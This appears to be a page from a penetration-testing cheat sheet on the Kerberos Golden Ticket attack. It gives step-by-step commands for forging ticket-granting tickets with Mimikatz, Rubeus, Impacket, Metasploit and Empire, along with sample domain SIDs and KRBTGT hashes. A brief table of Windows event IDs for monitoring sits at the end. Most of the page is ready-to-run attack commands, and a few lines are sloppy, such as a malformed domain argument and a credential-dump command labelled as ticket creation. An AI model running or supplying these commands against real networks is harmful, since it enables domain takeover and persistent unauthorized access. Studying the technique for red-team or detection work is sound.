---
description: >-
  The Golden Ticket attack is a sophisticated technique used to exploit the
  Kerberos authentication protocol. Kerberos is widely used in enterprise
  environments to provide secure authentication and ...
cover: ../.gitbook/assets/Golden Tickets.png
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# 🥇 Golden Ticket

<figure><img src="../.gitbook/assets/Golden Tickets.png" alt=""><figcaption></figcaption></figure>

### Forging TGT = Golden Ticket

A Kerberos Golden Ticket is a forged authentication ticket that grants unauthorized access to a Windows domain controller. It is typically used by attackers who have compromised a domain controller and gained access to its password hashes, allowing them to generate a valid ticket-granting ticket (TGT).

<details>

<summary><strong>ATT&#x26;CK ID:</strong> <a href="https://attack.mitre.org/techniques/T1558/001/">T1558.001</a></summary>

Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden tickets. Golden tickets enable adversaries to generate authentication material for any account in Active Directory.

</details>

### Learn the Theory Behind Golden Tickets Attacks

{% embed url="https://ad-attacks.com/golden-ticket-attack-explained/" %}

### When to use a Golden Ticket?

### Requirements to forge a Golden Ticket

{% hint style="danger" %}
Full domain compromise (Domain Admin) is required
{% endhint %}

<table><thead><tr><th width="281.3333333333333">Info</th><th width="464">Example</th></tr></thead><tbody><tr><td>Domain</td><td>poplabsec.rfs</td></tr><tr><td>Domain SID</td><td>S-1-5-21-3523557010-2506964455-2614950430</td></tr><tr><td>KRBTGT NTLM / AES256 Hash</td><td>f3bc61e97fb14d18c42bcbf6c3a9055f</td></tr></tbody></table>

### How to Create Golden Tickets with MimiKatz?

{% hint style="success" %}
Check the parameter /ptt - it open a new shell with the created ticket in that session
{% endhint %}

{% code overflow="wrap" %}
```powershell
mimikatz kerberos::golden /domain:rfs,local /sid:<string> /user:Administrator /krbtgt:<NTLM Hash> /ptt
```
{% endcode %}

### How to Create Golden Tickets with Rubeus?

{% code overflow="wrap" %}
```
rubeus.exe hash /user:rfs /domain:poplabsec.rfs /password:Password@1
```
{% endcode %}

<pre data-overflow="wrap"><code>rubeus.exe golden /<a data-footnote-ref href="#user-content-fn-1">aes256</a>:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /user:rfs /printcmd
</code></pre>

### How to Create Golden Tickets with Impacket?

{% code overflow="wrap" %}
```
python secretsdump.py administrator:Paa@987@192.168.1.105 -outputfile krb -user-status
```
{% endcode %}

### How to Create Golden Tickets with Metasploit?

```
load kiwi
dcsync_ntlm krbtgt
```

{% code overflow="wrap" %}
```
golden_ticket_create -d poplabsec.rfs -u rfs -s S-1-5-21-3523557010-2506964455-2614950430 -k f3bc61e97fb14d18c42bcbf6c3a9055f -t /root/Desktop/ticket.kirbi
```
{% endcode %}

### How to Create Golden Tickets with Empire?

```
usemodule credential/mimikatz/golden_ticket
set domain
set sid
set user rfs
set group
set id 500
set krbtgt_hash
```

### Monitoring Golden Tickets

<table data-full-width="true"><thead><tr><th width="137">Event ID</th><th width="397">Description</th><th>Fields</th></tr></thead><tbody><tr><td>4769</td><td>A Kerberos Service Ticket was requested.</td><td>Account Name, Service Name, Client Address</td></tr><tr><td>4624</td><td>An account was successfully logged on.</td><td>Account Name, Account Domain, Logon ID</td></tr><tr><td>4627</td><td>Identifies the account that requested the logon.</td><td>Security ID, Account Name, Account Domain, Logon ID</td></tr></tbody></table>

### References

1. [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)
2. [https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)
3. [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
4. [Metasploit | Penetration Testing Software, Pen Testing Security | Metasploit](https://www.metasploit.com/)
5. [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

[^1]: 
